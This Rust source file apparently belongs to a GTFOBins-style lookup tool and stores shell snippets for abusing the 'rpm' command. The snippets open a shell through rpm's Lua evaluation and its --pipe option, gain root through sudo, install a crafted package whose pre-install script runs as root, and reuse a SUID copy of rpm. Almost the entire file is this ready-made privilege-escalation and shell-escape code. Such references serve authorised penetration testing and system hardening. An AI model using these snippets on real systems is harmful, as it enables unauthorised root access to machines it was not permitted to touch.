pub static BIN_NAME: &'static str = "rpm";
pub static SH_CODE_1: &'static str = r#"
    
    rpm --eval '%{lua:os.execute("/bin/sh")}'
"#;
pub static SH_CODE_2: &'static str = r#"
    
    rpm --pipe '/bin/sh 0<&1'
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
"#;
pub static SUDO_DESC_2: &'static str = "It runs commands using a specially crafted RPM package. Generate it with `fpm` and upload it to the target";
pub static SUDO_CODE_2: &'static str = r#" 
    
    TF=$(mktemp -d)
    echo 'id' > $TF/x.sh
    fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF

    sudo rpm -ivh x-1.0-1.noarch.rpm
"#; // combined 2 code snippets here
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which rpm) .

    ./rpm --eval '%{lua:os.execute("/bin/sh")}'
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
